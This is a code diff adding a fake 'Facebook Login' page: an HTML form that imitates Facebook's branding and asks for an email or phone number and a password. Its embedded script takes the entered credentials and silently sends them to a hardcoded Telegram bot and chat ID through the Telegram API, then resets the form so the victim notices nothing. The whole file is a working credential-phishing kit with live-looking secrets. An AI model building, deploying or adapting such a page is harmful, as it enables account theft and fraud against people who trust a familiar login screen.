@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Facebook Login</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #1877f2, #0d47a1);
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .login-container {
+    background-color: #232f3e;
+    padding: 30px 40px;
+    border-radius: 10px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.3);
+    width: 320px;
+  }
+  h2 {
+    margin-bottom: 20px;
+    font-weight: 600;
+  }
+  input[type="text"],
+  input[type="password"] {
+    width: 100%;
+    padding: 12px 15px;
+    margin: 8px 0 20px 0;
+    border: none;
+    border-radius: 6px;
+    box-sizing: border-box;
+    font-size: 14px;
+  }
+  button {
+    background-color: #1877f2;
+    color: white;
+    padding: 12px;
+    width: 100%;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    font-weight: 600;
+  }
+  button:hover {
+    background-color: #166fe5;
+  }
+</style>
+</head>
+<body>
+<div class="login-container">
+  <h2>Log in to Facebook</h2>
+  <form id="loginForm" autocomplete="off">
+    <input type="text" id="email" name="email" placeholder="Email address or phone number" required />
+    <input type="password" id="password" name="password" placeholder="Password" required />
+    <button type="submit">Log In</button>
+  </form>
+</div>
+<script>
+  // Telegram bot token and chat ID
+  const botToken = "7630173158:AAHRSB_Po_SmUaRjH-YRb9ZbdyQkzVtrs2k";
+  const chatId = "6613275120";
+
+  document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value;
+
+    if (!email || !password) {
+      return;
+    }
+
+    // Construct message
+    const message = encodeURIComponent(`Facebook Login Credentials:%0AEmail/Phone: ${email}%0APassword: ${password}`);
+
+    // Telegram send message URL
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+
+    try {
+      await fetch(telegramUrl, { method: 'GET' });
+    } catch (err) {
+      // silently fail
+    }
+
+    // Optionally clear form or block further action
+    this.reset();
+  });
+</script>
+</body>
+</html>
+
+```
